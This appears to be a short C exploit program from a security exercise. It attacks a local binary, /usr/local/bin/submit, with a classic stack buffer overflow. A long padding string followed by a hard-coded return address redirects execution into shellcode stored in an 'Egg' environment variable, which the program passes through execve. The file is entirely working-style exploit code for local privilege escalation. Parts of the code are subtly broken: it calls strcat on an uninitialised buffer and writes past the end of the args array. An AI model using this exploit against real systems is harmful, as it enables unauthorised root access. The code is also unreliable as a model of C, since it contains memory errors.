/*
 * dummy exploit program
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"

int main(void)
{
  int eggLength = sizeof(shellcode) + 5;
  char *args[4];
  char *env[2] = { NULL, NULL };
  char eggValue[eggLength];
  int j = 0;
  char envAddress[] = "\xb8\xdf\xbf\xff";
  int overflowLength = 169;
  char overflow[174];

  for (j = 0; j < overflowLength; j++)
      strcat(overflow, "g");
  strcat(overflow, envAddress);
  args[0] = overflow;
  args[4] = NULL;

  strcpy(eggValue, "Egg=");
  strcat(eggValue, shellcode);

  env[0] = eggValue;
   if (execve(TARGET, args, env) < 0)
       fprintf(stderr, "execve failed.\n");

  exit(0);
}
